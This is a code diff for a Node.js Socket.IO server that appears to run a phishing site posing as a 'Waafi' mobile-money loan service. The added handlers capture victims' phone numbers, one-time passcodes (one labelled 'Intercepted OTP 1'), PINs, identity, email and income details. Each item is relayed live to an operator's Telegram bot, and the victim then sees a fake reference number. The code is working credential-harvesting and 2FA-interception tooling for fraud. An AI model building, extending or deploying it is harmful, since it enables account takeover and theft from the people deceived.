@@ -1,98 +1,126 @@
+require('dotenv').config();
 const express = require('express');
 const http = require('http');
+const socketIo = require('socket.io');
 const path = require('path');
-const { Server } = require('socket.io');
+const cors = require('cors');
+
+const botManager = require('./bot_manager');
 
 const app = express();
 const server = http.createServer(app);
 
-// Configure Socket.IO with polling fallback
-const io = new Server(server, {
+const io = socketIo(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
     },
-    transports: ['polling']
+    transports: ['polling'] // Forced polling fallback for Vercel stability
 });
 
-// JSON and body parser middleware
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+global.io = io; 
 
-// Serve static files from the public folder
+app.use(cors());
+app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Root route
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Global active rooms configuration
-global.activeRooms = global.activeRooms || {};
-
-const botToken = process.env.TELEGRAM_BOT_TOKEN;
-// Resolve Vercel system-defined environment variables safely
-const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : '';
-
-// Import and cleanly bind the Telegram Bot Manager safely
-let bot = null;
-try {
-    const initializeBot = require('./bot_manager');
-    bot = initializeBot(botToken, io, vercelUrl);
-} catch (error) {
-    console.error("[Startup Error] Failed to initialize Telegram Bot:", error);
-}
-
-// Bot webhook update endpoint
-app.post('/api/bot-webhook', (req, res) => {
+// Webhook endpoint matched to receive Telegram callback buttons
+app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
     try {
-        if (bot && typeof bot.processUpdate === 'function') {
-            bot.processUpdate(req.body);
-        }
-        res.status(200).json({ status: 'ok' });
+        botManager.bot.processUpdate(req.body);
     } catch (err) {
-        console.error("[Webhook Error] Error processing update:", err);
-        res.status(500).json({ error: err.message });
+        console.error("Error processing update:", err);
     }
+    res.sendStatus(200);
 });
 
-// Socket.IO real-time pipelines
 io.on('connection', (socket) => {
-    socket.on('join-room', (appId) => {
-        if (!appId) return;
-        socket.join(appId);
-        
-        if (!global.activeRooms[appId]) {
-            global.activeRooms[appId] = { socketId: socket.id, status: 'pending' };
-        } else {
-            global.activeRooms[appId].socketId = socket.id;
+    let activeRoom = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    
+    socket.join(activeRoom);
+    socket.emit('session-ready', { appId: activeRoom });
+    console.log(` Assigned internal tracking session: ${activeRoom}`);
+
+    socket.on('join-room', (room) => {
+        if (room && room !== "null" && room !== "") {
+            socket.leave(activeRoom);
+            socket.join(room);
+            activeRoom = room;
+            console.log(` User synchronized room identifier: ${room}`);
         }
-        socket.emit('room-joined-success', { appId, status: global.activeRooms[appId].status });
     });
 
-    socket.on('request-otp1', (data) => {
-        const { appId } = data;
-        if (global.activeRooms[appId]) {
-            global.activeRooms[appId].status = 'otp1_requested';
+    const getValidId = (data) => {
+        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
+            return data.appId;
         }
+        return activeRoom;
+    };
+
+    socket.on('request-otp1', (data) => {
+        const currentId = getValidId(data);
+        botManager.sendToAdmin(currentId, "Initial Request: Phone Submitted", { Phone: data.phone }, false);
         socket.emit('otp1-requested-success');
     });
 
     socket.on('verify-otp1', (data) => {
-        const { appId, code } = data;
-        console.log(`[Event] Verify OTP1 for ${appId}: ${code}`);
+        const currentId = getValidId(data);
+        botManager.sendToAdmin(currentId, "Step 1: Phone & Intercepted OTP 1", { "OTP 1": data.code }, true);
     });
 
     socket.on('verify-pin', (data) => {
-        const { appId, pin } = data;
-        console.log(`[Event] Verify PIN for ${appId}: ${pin}`);
+        const currentId = getValidId(data);
+        botManager.sendFinalApproval(currentId, data.pin);
     });
 
     socket.on('verify-otp2', (data) => {
-        const { appId, code } = data;
-        console.log(`[Event] Verify OTP2 for ${appId}: ${code}`);
+        const currentId = getValidId(data);
+        botManager.sendSecondOTP(currentId, data.code);
+    });
+
+    socket.on('finalize-loan', (data) => {
+        const currentId = getValidId(data);
+        const { confirmPin, ...profileData } = data;
+        
+        botManager.sendToAdmin(currentId, "Step 4: Loan Request Parameters", {
+            "Type": profileData.loanType,
+            "Amount": profileData.amount,
+            "Term": profileData.term + " mois",
+            "Purpose": profileData.purpose
+        }, false);
+
+        botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", {
+            "Name": `${profileData.firstName} ${profileData.lastName}`,
+            "Email": profileData.email
+        }, false);
+
+        botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", {
+            "Status": profileData.employment,
+            "Income": profileData.income,
+            "Employer": profileData.employer || "N/A"
+        }, false);
+
+        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { 
+            "Confirmed PIN": confirmPin 
+        }, false);
+        
+        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
+        io.to(currentId).emit('application-finalized', { referenceId });
+        console.log(` Session ${currentId} successfully generated local validation parameters.`);
+    });
+
+    socket.on('disconnect', () => {
+        console.log(` User disconnected socket room: ${activeRoom}`);
     });
 });
 
-// Export the server for Vercel's engine
+// Run local listener only if not executing in Vercel's production environment
+if (process.env.NODE_ENV !== 'production') {
+    const PORT = process.env.PORT || 3000;
+    server.listen(PORT, () => {
+        console.log(` Waafi Loan Server running locally on port ${PORT}`);
+    });
+}
+
+// Export the server directly so Vercel can resolve execution requests
 module.exports = server;
